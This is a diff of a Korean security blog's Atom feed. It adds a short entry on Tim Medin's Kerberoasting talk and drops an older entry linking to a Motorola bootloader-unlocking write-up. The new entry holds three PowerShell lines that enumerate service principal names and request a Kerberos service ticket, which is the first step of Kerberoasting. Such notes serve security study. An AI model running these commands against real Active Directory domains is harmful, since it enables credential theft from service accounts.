@@ -4,7 +4,7 @@
   <title><![CDATA[KC's blog]]></title>
   <link href="http://zomo.heroku.com/atom.xml" rel="self"/>
   <link href="http://zomo.heroku.com/"/>
-  <updated>2016-08-24T15:24:12+09:00</updated>
+  <updated>2017-02-21T10:10:32+09:00</updated>
   <id>http://zomo.heroku.com/</id>
   <author>
     <name><![CDATA[KC]]></name>
@@ -12,6 +12,23 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Attacking Microsoft KerberosKicking the Guide Dog of Hades]]></title>
+    <link href="http://zomo.heroku.com/blog/2017/02/21/attacking-microsoft-kerberoskicking-the-guide-dog-of-hades/"/>
+    <updated>2017-02-21T10:06:24+09:00</updated>
+    <id>http://zomo.heroku.com/blog/2017/02/21/attacking-microsoft-kerberoskicking-the-guide-dog-of-hades</id>
+    <content type="html"><![CDATA[<p>Tim Medin 의 talk.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PS&gt; setspn -T medin.local -F -Q */*
+</span><span class='line'>PS&gt; Add-Type -AssemblyName System.IdentityModel
+</span><span class='line'>PS&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[RC4 Weakness]]></title>
@@ -1555,17 +1572,6 @@ OpenSSL 버그때문에, 서버 설정에 상관없이, 강제로 SSLv2 로 네�
 
 
 <h4>Managing Free Chunks</h4>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Unlocking the Motorola Bootloader by Azimuth Security]]></title>
-    <link href="http://zomo.heroku.com/blog/2016/02/12/unlocking-the-motorola-bootloader-by-azimuth-security/"/>
-    <updated>2016-02-12T10:12:12+09:00</updated>
-    <id>http://zomo.heroku.com/blog/2016/02/12/unlocking-the-motorola-bootloader-by-azimuth-security</id>
-    <content type="html"><![CDATA[<p>이번에는 좀 오래되었지만, Azimuth Security 블로그의 글을 정리해본다.</p>
-
-<p><a href="http://blog.azimuthsecurity.com/2013/04/unlocking-motorola-bootloader.html?m=1">Unlocking the Motorola Bootloader</a></p>
 ]]></content>
   </entry>
   
